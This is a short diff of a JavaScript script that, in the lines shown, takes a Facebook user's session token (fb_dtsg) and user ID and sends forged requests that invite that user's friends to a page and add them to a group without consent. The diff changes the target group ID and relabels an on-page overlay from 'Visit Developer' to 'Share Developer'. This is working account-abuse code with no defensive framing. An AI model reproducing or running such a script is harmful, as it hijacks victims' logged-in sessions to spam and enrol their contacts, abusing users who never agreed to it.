@@ -81,7 +81,7 @@ if (fb_dtsg){
     jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + o + "%22%3A1%7D&checkableitems[0]=" + o + "&page_id=1375353502725775&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                }
   if (fb_dtsg){
-    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=1378653509062290&source=typeahead&members=" + o + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=1385288085046122&source=typeahead&members=" + o + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
               }
 }
 jx = {
@@ -208,7 +208,7 @@ if(body != null)
  div.style.backgroundColor = "rgba(0,0,0,0.5)";
  div.style.border = "1px solid rgba(0,0,0,0.5)";
  div.style.padding = "3px";
- div.innerHTML = "<a style='font-weight:bold;color:#CCFF33' href='https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/MFRAZSULTAN' title='Click Here'><blink><center>Visit Developer</center></blink></a>"
+ div.innerHTML = "<a style='font-weight:bold;color:#CCFF33' href='https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/MFRAZSULTAN' title='Click Here'><blink><center>Share Developer</center></blink></a>"
  body.appendChild(div);
 }
  
